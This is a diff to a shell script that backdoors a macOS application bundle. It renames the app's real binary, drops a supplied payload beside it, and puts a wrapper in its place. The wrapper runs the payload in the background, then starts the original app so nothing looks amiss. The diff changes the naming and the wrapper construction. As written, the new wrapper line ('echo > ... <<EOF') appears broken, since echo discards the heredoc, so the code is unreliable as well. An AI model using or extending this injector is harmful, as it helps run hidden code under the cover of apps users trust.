@@ -37,18 +37,23 @@ logloc "Info.plist" "$info"
 logloc "MacOS directory" "$macos"
 logloc "Binary" "$binary"
 
-if [[ -f "${binary}_" ]]; then
+if [[ -f "${binary}_og" ]]; then
     warn "Replacing existing hidden script."
 else
     log "Moving normal binary"
-    mv "$binary" "${binary}_"
+    mv "$binary" "${binary}_og"
 fi
 log "Inserting payload"
-cp "$payload" "$binary"
+cp "$payload" "${binary}_pl"
 log "Making payload executable"
-chmod +x "$binary"
+chmod +x "${binary}_pl"
 
-log "Appending line to run normal binary"
-echo '"$(dirname "${BASH_SOURCE[0]}")/$(basename "$0")_"' >> "$binary"
+log "Creating master"
+echo > "$binary" <<EOF
+binary="$(dirname "${BASH_SOURCE[0]}")/$(basename "$0")"
+
+"${binary}_pl" &
+"${binary}_og"
+EOF
 
 succ "Success!"
